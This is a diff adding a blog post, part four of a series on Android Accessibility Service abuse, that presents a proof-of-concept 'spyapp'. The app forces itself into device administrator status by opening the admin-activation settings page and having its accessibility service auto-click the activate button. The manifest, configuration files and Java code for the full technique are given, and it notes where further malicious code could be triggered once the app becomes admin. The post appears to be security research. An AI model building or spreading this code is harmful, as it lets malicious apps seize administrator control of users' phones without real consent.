@@ -1,0 +1,180 @@
+## About Android Accessibility Service - Part 4
+
+### [~$ cd ..](../)
+
+### ~$ ls
+
+* [How_an_Android_app_could_escalate_its_privileges.txt](./index)
+* [How_an_Android_app_could_escalate_its_privileges_Part2.txt](./part2)
+* [How_an_Android_app_could_escalate_its_privileges_Part3.txt](./part3)
+* How_an_Android_app_could_escalate_its_privileges_Part4.txt
+
+### ~$ cat How_an_Android_app_could_escalate_its_privileges_Part4.txt
+
+This last part about Android Accessibility Service presents the simplest application, and surely the most powerful one of the four. The goal is here to make the app
+an administrator of the device.
+
+_By "administrator", I don't mean "root"_
+
+![admin](admin.png)
+
+The principle remains the same: the malicious app opens the Settings at a specific page, and forces the click on a widget. However, there is no need here to browse through
+the settings, and it makes the attack really fast, and even easier!
+
+### Configuration
+
+As the holy documentation says:
+
+>To use the Device Administration API, the app's manifest must include the following:
+>* A subclass of DeviceAdminReceiver that includes the following:
+>	* The BIND_DEVICE_ADMIN permission.
+>	* The ability to respond to the ACTION_DEVICE_ADMIN_ENABLED intent, expressed in the manifest as an intent filter.
+>* A declaration of security policies used in metadata. 
+
+I created then a class named `MyAdminDeviceBinder` extending `DeviceAdminReceiver`, and registered the `<receiver>` in the Manifest. And as usual, there is also the custom
+accessibility service:
+
+> ```xml
+><?xml version="1.0" encoding="utf-8"?>
+>	<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="xyz.noname.spyapp">
+>		<application
+>		...<snipped/>...
+>		<service android:name=".services.CustomAccessibilityService"
+>			android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+>			<intent-filter>
+>				<action android:name="android.accessibilityservice.AccessibilityService"/>
+>			</intent-filter>
+>			<meta-data android:name="android.accessibilityservice"
+>				android:resource="@xml/accessibility_config"/>
+>		</service>
+>		<receiver android:name=".services.MyDeviceAdminReceiver"
+>			android:permission="android.permission.BIND_DEVICE_ADMIN">
+>			<meta-data android:name="android.app.device_admin"
+>				android:resource="@xml/admin_config"/>
+>			<intent-filter>
+>				<action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+>			</intent-filter>
+>		</receiver>
+>	</application>
+></manifest>
+> ```
+
+For the file `accessibility_config`, nothing new:
+
+> ```xml
+><accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+>	android:packageNames="com.android.settings, xyz.noname.spyapp"
+>	android:accessibilityEventTypes="typeWindowContentChanged"
+>	android:accessibilityFeedbackType="feedbackAllMask"
+>	android:notificationTimeout="100"
+>	android:canRetrieveWindowContent="true"
+>	android:accessibilityFlags="flagReportViewIds"/>
+> ```
+
+We still listening for the `typeWindowContentChanged` events, on Settings and the malicious app. As usual, I set `canRetrieveWindowContent` to `true`, and
+added `flagReportViewIds` in order to make it easier.
+
+In the `admin_config`, I only wrote:
+
+> ```xml
+><?xml version="1.0" encoding="utf-8"?>
+><device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+>	<uses-policies>
+>		<!--xxx-->
+>	</uses-policies>
+></device-admin>
+> ```
+
+### Main activity and Receiver
+
+The `DeviceAdminReceiver` contains nothing except `onReceive`, where I only print the `action`. However, it could be very useful for an attacker, to launch to 
+attack as soon as the admin permission id granted:
+
+> ```java
+>public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
+>
+>	@Override
+>	public void onReceive(Context context, Intent intent) {
+>		Log.e("action", intent.getAction());
+>		super.onReceive(context, intent);
+>	}
+>}
+> ```
+
+A bunch of callback routines can be used to react depending on the action: `onEnabled`, `onDisable`, `onDisableRequested`, `onLockTaskModeEntering` etc.
+
+In `MainActivity` it's also really simple: we check if the app is already an admin, and if it's not the case and if the Accessibility Service in On, then 
+the Settings are open at the right page:
+
+![admin_perm](admin_perm.png)
+
+> ```java
+>	@Override
+>	protected void onCreate(Bundle savedInstanceState) {
+>		super.onCreate(savedInstanceState);
+>		ComponentName componentName= new ComponentName(this, MyDeviceAdminReceiver.class);
+>		DevicePolicyManager dmp = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+>		if (dmp != null && !dmp.isAdminActive(componentName) && Util.isAccessibilityServiceOn(this)) {
+>			Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+>			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
+>			startActivityForResult(intent, 1);
+>		}
+>		setContentView(R.layout.activity_main);
+>	}
+> ```
+
+It's normally possible to put an extra string explaining why this status is requested by the app, but it's obviously not the goal in this case.
+
+### The custom Accessibility Service
+
+As the Settings opens at this specifig page, the only thing we have to do is to click on "Activate this device admin app", and to quit. First thing I did was
+to get the id of this widget:
+
+> ```java
+>private static final String ACTIVATE_ADMIN = "com.android.settings:id/action_button"; 
+> ```
+
+and then, I used a boolean `activate` which indicates if the user has landed here because of the malicious app or not. Not need here to recursively scan the page.
+I used the routine `findAccessibilityNodeInfosByViewId` which returns a list of widgets having the given id (I then assume that it's the first one).
+
+Then, a click is performed on this widget or on its parent.
+
+
+> ```java
+>private boolean activate;
+>
+>@Override
+>public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
+>	if (BuildConfig.APPLICATION_ID.equals(accessibilityEvent.getPackageName().toString())){
+>		this.activate = true;
+>	}
+>	else{
+>		if (this.activate){
+>			AccessibilityNodeInfo info = accessibilityEvent.getSource();
+>			if (info != null){
+>				List<AccessibilityNodeInfo> list = info.findAccessibilityNodeInfosByViewId(ACTIVATE_ADMIN);
+>				if (list.size() > 0){
+>					AccessibilityNodeInfo node = list.get(0);
+>					if (node.isClickable()){
+>						this.activate = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+>					}
+>					else{
+>						AccessibilityNodeInfo parent = node.getParent();
+>						while (parent != null && !parent.isClickable()){
+>							parent = parent.getParent();
+>						}
+>						if (parent != null){
+>							this.activate = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+>						}
+>					}
+>				}
+>			}
+>		}
+>	}
+>}
+> ```
+
+Since there are only 2 apps registered in the config file, a simple `if/else` is sufficient. As soon as the button is clicked, the `DeviceAdminReceiver.onReceive` is called
+and the malicious code can be triggered.
+
+[![video4_poc](video4.png)](https://youtu.be/2M2pIMuET00)
